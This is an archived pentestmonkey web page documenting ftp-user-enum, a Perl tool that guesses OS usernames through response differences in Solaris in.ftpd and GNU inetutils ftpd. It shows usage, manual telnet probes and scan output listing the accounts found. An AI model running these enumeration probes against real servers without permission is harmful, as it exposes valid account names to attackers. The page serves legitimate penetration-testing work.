<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>ftp-user-enum | pentestmonkey</title>
<link rel="stylesheet" href="../../wp-content/themes/baza-noclegowa/style.css" type="text/css" media="screen" />
<link rel="pingback" href="https://pentestmonkey.net/xmlrpc.php" />
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Feed" href="../../feed" />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Comments Feed" href="../../comments/feed" />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; ftp-user-enum Comments Feed" href="ftp-user-enum/feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentestmonkey.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.3"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.8.3.css' type='text/css' media='all' />
<link rel="https://api.w.org/" href="../../wp-json/index.html" /><link rel="alternate" type="application/json" href="../../wp-json/wp/v2/posts/106" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../xmlrpc.php%3Frsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../wp-includes/wlwmanifest.xml" /> 
<link rel="canonical" href="../../index.html%3Fp=106.html" />
<link rel='shortlink' href='../../index.html%3Fp=106.html' />
<link rel="alternate" type="application/json+oembed" href="../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fpentestmonkey.net%252Ftools%252Fuser-enumeration%252Fftp-user-enum" />
<link rel="alternate" type="text/xml+oembed" href="../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fpentestmonkey.net%252Ftools%252Fuser-enumeration%252Fftp-user-enum&amp;format=xml" />
	
<!--[if IE 6]><script src="https://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-106 single-format-standard">
	<div class="all-page">
		
		<div class="container">
			
			<!-- HEADER -->
			<div id="header">
			    <div class="website-name"><a href="../../index.html">pentestmonkey</a></div>
				<div class="slogan">Taking the monkey work out of pentesting</div>
			</div>
			<div class="clear"></div>
			<!-- /HEADER -->

			<!-- main NAVIGATION -->
			<div id="mainNav">
				<div class="wrap">
    <ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="../../category/site-news.html"><span>Site News</span></a></li>
<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="../../category/blog/index.html"><span>Blog</span></a></li>
<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-136"><a href="../../category/tools/index.html"><span>Tools</span></a></li>
<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="../../category/yaptest/index.html"><span>Yaptest</span></a></li>
<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-134"><a href="../../category/cheat-sheet.html"><span>Cheat Sheets</span></a></li>
<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="../../category/contact.html"><span>Contact</span></a></li>
</ul>    <div class="clear"><!-- --></div>
				</div>
			</div>
			<!-- /main NAVIGATION -->
			<div class="clear"></div>


			<!-- CONTENT -->
			<div id="content">
	<!-- Start: Left Panel -->
	<div class="content">

	
		<div class="post-106 post type-post status-publish format-standard hentry category-user-enumeration tag-ftpuserenum tag-pentest tag-tool tag-userenumeration" id="post-106">
			<h1>ftp-user-enum</h1>

			<div class="entryContent">
				<p>Username guessing tool for use against the default Solaris ftp service and GNU inetutils ftpd.Â  Recent changes are detailed in the <a href="https://pentestmonkey.net/tools/tools/ftp-user-enum/CHANGELOG">CHANGELOG.</a></p>
<p>Download ftp-user-enum v1.0 <a href="../ftp-user-enum/ftp-user-enum-1.0.tar.gz">here</a>.</p>
<p>SHA1sum: 2fbd86dba9f701627d415ed76100b2768b271862</p>
<p>MD51sum: c19ec3eb1eab6282a16514b51eb5f1c6</p>
<p>User documentation are also avaialble in <a href="../ftp-user-enum/ftp-user-enum-user-docs.pdf">PDF</a> format.</p>
<p><span id="more-106"></span></p>
<p>&nbsp;</p>
<h1 align="center">ftp-user-enum User Documentation</h1>
<p>&nbsp;</p>
<h2><a title="SECTION00010000000000000000" name="SECTION00010000000000000000"></a> Contents</h2>
<ul>
<li><a title="tex2html11" name="tex2html11" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00020000000000000000"></a>Overview</li>
<li><a title="tex2html12" name="tex2html12" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00030000000000000000"></a>Installation</li>
<li><a title="tex2html13" name="tex2html13" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00040000000000000000"></a>Usage</li>
<li><a title="tex2html14" name="tex2html14" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00050000000000000000"></a>Some Examples
<ul>
<li><a title="tex2html15" name="tex2html15" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00051000000000000000"></a>Against Solaris in.ftpd</li>
<li><a title="tex2html16" name="tex2html16" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00052000000000000000"></a>Against GNU inetutils ftpd</li>
</ul>
</li>
<li><a title="tex2html17" name="tex2html17" href="https://pentestmonkey.net/tools/user-enumeration/ftp-user-enum-user-docs.html#SECTION00060000000000000000"></a>License</li>
</ul>
<p>&nbsp;</p>
<h1><a title="SECTION00020000000000000000" name="SECTION00020000000000000000"></a>Overview</h1>
<p>ftp-user-enum is a tool for enumerating OS-level user accounts via the ftp service. As of release v1.0 it is known to work against the default Solaris in.ftpd and GNU inetutils ftpd. It should be fairly simple to modify to script to work against other vulnerable ftp servers such as:</p>
<div align="center">
<table border="0" cellpadding="3">
<tbody>
<tr>
<td align="left">BlackMoon FTP Server</td>
<td align="left">http://xforce.iss.net/xforce/xfdb/12046</td>
</tr>
<tr>
<td align="left">ArGoSoft FTP Server</td>
<td align="left">http://xforce.iss.net/xforce/xfdb/18721</td>
</tr>
<tr>
<td align="left">MegaBrowser FTP Server</td>
<td align="left">http://www.securityfocus.com/archive/1/323813</td>
</tr>
</tbody>
</table>
</div>
<h1><a title="SECTION00030000000000000000" name="SECTION00030000000000000000"></a>Installation</h1>
<p>ftp-user-enum is just a stand alone PERL script, so installation is as simple as copying it to your path (e.g. /usr/local/bin). It has only been tested under Linux so far.</p>
<p>It depends on the following PERL modules which you may need to install them first:</p>
<ul>
<li>Socket</li>
<li>IO::Handle</li>
<li>IO::Select</li>
<li>IO::Socket::INET</li>
<li>Getopt::Std</li>
</ul>
<p>If you have PERL installed, you should be able to install the modules from CPAN:</p>
<pre> # perl -MCPAN -e shell
 cpan&gt; install Getopt::Std</pre>
<h1><a title="SECTION00040000000000000000" name="SECTION00040000000000000000"></a>Usage</h1>
<p>ftp-user-enum simply needs to be passed a list of users and at least one target running an ftp service. Here&#8217;s the usage message:</p>
<pre> Usage: ftp-user-enum.pl [options] (-u username|-U file-of-usernames) (-t host|-T file-of-targets) 

 Enumerates users via FTP daemon specific bugs:
 - Solaris FTPd responds differently to "CWD ~user" and "CWD ~nosuchuser" commands
 - GNU Inetutils responds differently "USER user" and "USER nosuchuser" commands 

 options are:
         -m n     Maximum number of resolver processes (default: 5)
         -u user  Check if user exists on remote system
         -U file  File of usernames to check via ftp service
         -M mode  Mode for enumerating users: "sol" for Solaris FTPd or
                 "iu" GNU Inetutils ftpd.  Default (default: sol)
         -t host  Server host running ftp service
         -T file  File of hostnames running the ftp service
         -p port  TCP port on which ftp service runs (default: 21)
         -d       Debugging output
         -t n     Wait a maximum of n seconds for reply (default: 15)
         -v       Verbose
         -h       This help message 

 Also see ftp-user-enum-user-docs.pdf in the ftp-user-enum tar ball. 

 Examples: 

 1) Enumerate users on a vulnerable Solaris host: 

 $ ftp-user-enum.pl -M sol -U users.txt -t 10.0.0.1 

 2) Enumerate users on a list of hosts running vulnerable Inetutils FTPd: 

 $ ftp-user-enum.pl -M iu -U users.txt -T ips.txt</pre>
<h1><a title="SECTION00050000000000000000" name="SECTION00050000000000000000"></a>Some Examples</h1>
<p>For the examples below we need a list of potential usernames. The following output demostrates the format for this list:</p>
<pre> $ head users.txt
 root
 bin
 daemon
 adm
 lp
 sync
 shutdown
 halt
 mail
 news</pre>
<h2><a title="SECTION00051000000000000000" name="SECTION00051000000000000000"></a> Against Solaris in.ftpd</h2>
<p>Vulnerable versions of in.ftpd return different responses to the CWD for home directories which exist and those that don&#8217;t. CWD commands can be issued before authentication:</p>
<pre>  $ telnet 10.0.0.1 21
 Trying 10.0.0.1...
 Connected to 10.0.0.1.
 Escape character is '^]'.
 220 test FTP server (SunOS 5.7) ready.
 CWD ~root
 530 Please login with USER and PASS.
 CWD ~notexist
 530 Please login with USER and PASS.
 550 Unknown user name after ~</pre>
<p>This vulnerability is documented at: http://www.securityfocus.com/bid/2564/info</p>
<p>Below is an example showing how to use ftp-user-enum to enumerate users using a vulnerable solaris FTP daemon:</p>
<pre> $ ftp-user-enum.pl -U users.txt -t 10.0.0.1
 Starting ftp-user-enum v1.0 ( http://pentestmonkey.net/tools/ftp-user-enum ) 

  ----------------------------------------------------------
 |                   Scan Information                       |
  ---------------------------------------------------------- 

 Mode ..................... sol
 Worker Processes ......... 5
 Usernames file ........... users.txt
 Target count ............. 1
 Username count ........... 149
 Target TCP port .......... 21
 Query timeout ............ 15 secs 

 ######## Scan started at Sat Mar 17 16:23:35 2007 #########
 root@10.0.0.1: root
 bin@10.0.0.1: bin
 daemon@10.0.0.1: daemon
 adm@10.0.0.1: adm
 lp@10.0.0.1: lp
 uucp@10.0.0.1: uucp
 nobody@10.0.0.1: nobody
 ftp@10.0.0.1: ftp
 ######## Scan completed at Sat Mar 17 16:24:06 2007 #########
 8 results. 

 149 queries in 31 seconds (4.8 queries / sec)</pre>
<h2><a title="SECTION00052000000000000000" name="SECTION00052000000000000000"></a> Against GNU inetutils ftpd</h2>
<p>Vulnerable versions of GNU inetutils ftpd respond to the USER command differently depending on whether it is used with a username that exists or one that doesn&#8217;t exist:</p>
<pre> $ telnet 10.0.0.2 21
 Trying 10.0.0.2...
 Connected to 10.0.0.2.
 Escape character is '^]'.
 220 localhost.localdomain FTP server (GNU inetutils 1.4.2) ready.
 USER root
 331 Password required for root.
 USER notexist
 530 44</pre>
<p>Here&#8217;s an example showing how to use ftp-user-enum to enumerate users using a vulnerable GNU inetutils daemon:</p>
<pre> $ ./ftp-user-enum.pl -M iu -U users.txt -t 10.0.0.2
 Starting ftp-user-enum v1.0 ( http://pentestmonkey.net/tools/ftp-user-enum ) 

  ----------------------------------------------------------
 |                   Scan Information                       |
  ---------------------------------------------------------- 

 Mode ..................... iu
 Worker Processes ......... 5
 Usernames file ........... users.txt
 Target count ............. 1
 Username count ........... 149
 Target TCP port .......... 21
 Query timeout ............ 15 secs 

 ######## Scan started at Sat Mar 17 16:29:28 2007 #########
 lp@10.0.0.2: lp
 sync@10.0.0.2: sync
 mail@10.0.0.2: mail
 root@10.0.0.2: root
 news@10.0.0.2: news
 uucp@10.0.0.2: uucp
 man@10.0.0.2: man
 user@10.0.0.2: user
 postgres@10.0.0.2: postgres
 nobody@10.0.0.2: nobody
 sshd@10.0.0.2: sshd
 games@10.0.0.2: games
 bin@10.0.0.2: bin
 daemon@10.0.0.2: daemon
 ######## Scan completed at Sat Mar 17 16:29:29 2007 #########
 14 results. 

 149 queries in 1 seconds (149.0 queries / sec)</pre>
<p>Performance note: The FTP server tries to do a reverse lookup on the IP address of the client. If the lookup is slow, your scan will be slow too.</p>
<h1><a title="SECTION00060000000000000000" name="SECTION00060000000000000000"></a>License</h1>
<p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>
<p>In all other respects the GPL version 2 applies:</p>
<pre> This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License version 2 as
 published by the Free Software Foundation. 

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details. 

 You should have received a copy of the GNU General Public License along
 with this program; if not, write to the Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</pre>
                <div class="clear"></div>
								<p class="postmeta"><span class="tags"><a href="../../tag/ftpuserenum.html" rel="tag">ftpuserenum</a>, <a href="../../tag/pentest/index.html" rel="tag">pentest</a>, <a href="../../tag/tool/index.html" rel="tag">tool</a>, <a href="../../tag/userenumeration.html" rel="tag">userenumeration</a></span></p>				<p class="postmeta"><span class="cats"><a href="../../category/tools/user-enumeration.html" rel="category tag">User Enumeration</a></span></p>
								
			<p></p>
		
			<div class="navigation2">
				<div class="alignright prev"><a href="../finger-user-enum/index.html" rel="prev">finger-user-enum</a></div>
				<div class="alignleft next"><a href="../../index.html%3Fp=7.html" rel="next">Preventing Web-based Directory Enumeration Attacks</a></div>
			</div>		

			</div>
		</div>

	
<!-- You can start editing here. -->


			<!-- If comments are open, but there are no comments. -->

	 
<p></p>
<br />


	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="../../index.html%3Fp=106.html#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="https://pentestmonkey.net/wp-login.php?redirect_to=https%3A%2F%2Fpentestmonkey.net%2Ftools%2Fuser-enumeration%2Fftp-user-enum">logged in</a> to post a comment.</p>	</div><!-- #respond -->
	




	
	</div>
				<!-- sidebar -->
				<div class="sideBar">
					
					<div class="nav">
						<div class="bFrameT"><i></i></div>
	<form method="get" id="searchform" action="../../index.html" class="searchForm">
	<p><input type="text" value="" name="s" id="s" class="field" />
	<input type="image" src="../../wp-content/themes/baza-noclegowa/images/search.gif" alt="" title="Search" id="searchsubmit" class="btn" /></p>
</form>
<h3><span>Categories</span></h3>
			<ul>
					<li class="cat-item cat-item-5"><a href="../../category/blog/index.html">Blog</a> (78)
</li>
	<li class="cat-item cat-item-39"><a href="../../category/cheat-sheet.html">Cheat Sheets</a> (10)
<ul class='children'>
	<li class="cat-item cat-item-40"><a href="../../category/cheat-sheet/shells.html">Shells</a> (1)
</li>
	<li class="cat-item cat-item-8"><a href="../../category/cheat-sheet/sql-injection.html">SQL Injection</a> (7)
</li>
</ul>
</li>
	<li class="cat-item cat-item-7"><a href="../../category/contact.html">Contact</a> (2)
</li>
	<li class="cat-item cat-item-3"><a href="../../category/site-news.html">Site News</a> (3)
</li>
	<li class="cat-item cat-item-4"><a href="../../category/tools/index.html">Tools</a> (17)
<ul class='children'>
	<li class="cat-item cat-item-14"><a href="../../category/tools/audit.html">Audit</a> (3)
</li>
	<li class="cat-item cat-item-16"><a href="../../category/tools/misc.html">Misc</a> (7)
</li>
	<li class="cat-item cat-item-13"><a href="../../category/tools/user-enumeration.html">User Enumeration</a> (4)
</li>
	<li class="cat-item cat-item-15"><a href="../../category/tools/web-shells.html">Web Shells</a> (3)
</li>
</ul>
</li>
	<li class="cat-item cat-item-1"><a href="../../category/uncategorized.html">Uncategorized</a> (3)
</li>
	<li class="cat-item cat-item-6"><a href="../../category/yaptest/index.html">Yaptest</a> (15)
<ul class='children'>
	<li class="cat-item cat-item-12"><a href="../../category/yaptest/front-end.html">Front End</a> (1)
</li>
	<li class="cat-item cat-item-9"><a href="../../category/yaptest/installing.html">Installing</a> (2)
</li>
	<li class="cat-item cat-item-11"><a href="../../category/yaptest/overview.html">Overview</a> (2)
</li>
	<li class="cat-item cat-item-10"><a href="../../category/yaptest/using.html">Using</a> (8)
</li>
</ul>
</li>
			</ul>

						
						<div class="bFrameB"><i></i></div>
					</div>
					
				</div>
				<!-- /sidebar -->	
				</div>
				<!-- /content -->
				
			</div>
			<!-- /CONTENT -->	
			
		
		<!-- bottom NAVIGATION -->
		<div id="bottomNav">
		</div>
		<!-- /bottom NAVIGATION -->
		
		<!-- FOOTER -->
		<div id="footer">
		<p class="footer-menu">
         <ul class="menu"></ul>        </p>
			
<div class="credits">Powered by <a href="http://wordpress.org/">WordPress</a>. Design: <a href="http://www.baza-noclegowa.pl/">Baza Noclegowa</a>.</div>
			
		</div>
		<!-- /FOOTER -->
	</div>
		<script type='text/javascript' src='../../wp-includes/js/wp-embed.min.js%3Fver=5.8.3' id='wp-embed-js'></script>
</body>
</html>
